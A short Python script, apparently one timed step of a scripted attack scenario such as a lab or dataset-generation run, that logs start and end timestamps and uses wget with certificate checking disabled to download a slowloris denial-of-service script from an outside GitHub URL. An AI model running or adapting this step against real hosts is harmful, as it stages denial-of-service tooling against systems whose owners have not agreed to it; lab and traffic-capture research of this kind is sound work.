import time
import sys
import os
import subprocess


def record_timestamp(folder, output_time_file):
    output_time_file = os.path.join(folder, output_time_file)
    with open(output_time_file, "w+") as fw:
        fw.write('%f' % time.time())


def main(argv):
    if len(argv) != 4:
        print("Usage: {} Folder local_ip target_ip".format(argv[0]))

    folder = argv[1]
    my_ip = argv[2]
    target_ip = argv[3]

    time.sleep(2)
    output_time_file_start = 'time_step_6_start.txt'
    record_timestamp(folder, output_time_file_start)
    time.sleep(2)

    download_the_app = 'wget --no-check-certificate https://raw.githubusercontent.com/masjohncook/local_slowloris/master/local_slowloris.py'
    subprocess.run(download_the_app.split(), stdout=subprocess.PIPE)

    # print(client.sessions.list['4'])
    time.sleep(30)
    output_time_file_end = 'time_step_6_end.txt'
    record_timestamp(folder, output_time_file_end)
    time.sleep(30)


main(sys.argv)
